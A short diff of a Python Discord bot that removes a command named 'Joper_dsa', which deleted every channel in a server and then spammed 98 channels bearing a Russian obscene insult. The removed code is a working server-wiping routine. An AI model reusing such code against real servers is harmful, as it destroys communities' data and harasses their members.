@@ -220,15 +220,6 @@ async def редстоунер_2(ctx):
 #-------------------------------------------------------------------------------------------
 
 
-@Bot.command()
-async def Joper_dsa(ctx):
-    for ch in Bot.get_guild(ctx.author.guild.id).channels:
-        await ch.delete()
-        print(ch)
-    for i in range(1,99):
-        await ctx.author.guild.create_text_channel('мама-гусика-шлюха')
-
-
 
 
 
